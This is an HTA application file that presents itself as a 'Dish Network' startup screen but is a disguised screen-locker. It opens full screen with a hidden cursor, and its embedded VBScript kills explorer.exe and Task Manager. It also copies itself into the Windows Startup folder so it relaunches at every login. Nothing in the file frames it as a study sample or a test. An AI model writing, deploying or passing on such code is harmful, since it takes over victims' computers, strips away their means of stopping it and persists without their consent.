<HTML>
<HEAD>
 
<meta http-equiv="X-UA-Compatible" content="IE=9" />  
<HTA:APPLICATION ID="oHTA"

    APPLICATIONNAME="Starting up... Dish Network"

    WINDOWSTATE="maximize"
    BORDER="none"

   >
</HEAD>
<BODY SCROLL="no">
<style>
html, body {
    margin: 0;
    padding: 0;
    height: 100%;
    overflow: hidden;
    background: black;
    cursor: none;
}

img {
    width: 100vw;
    height: 100vh;
    object-fit: fill; /* stretches image */
}
</style>
  <script language="VBScript">
    Set shell = CreateObject("WScript.Shell")
    shell.Run "taskkill /f /im explorer.exe", 0, True
    shell.Run "taskkill /f /im taskmgr.exe", 0, True
    shell.Run "copy %USERPROFILE%\Downloads\doot.hta %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup", 0, True
  </script>
</head>
<body>
<img src="data:image/png;base64,">
</BODY>
</HTML>
